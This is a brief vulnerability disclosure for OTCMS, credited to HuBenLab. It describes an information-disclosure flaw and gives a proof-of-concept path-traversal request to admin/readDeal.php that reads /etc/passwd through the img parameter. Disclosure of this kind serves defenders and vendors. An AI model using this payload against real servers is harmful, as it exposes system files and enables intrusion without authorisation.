# OTCMS was discovered obtain the web directory path and other information leaked 

## Description
    OTCMS was discovered to contain an information disclosure vulnerability which allows attackers to obtain the web directory path and other information leaked by the server via a crafted web request.
## Vendor Homepage
    http://otcms.com/

## Author
    HuBenLab
## Proof of Concept
payload:

```
admin/readDeal.php?mudi=readQrCode&img=../../../../../../../../../etc/passwd
```

![image-20230606130832410](./img/image-20230606130832410.png)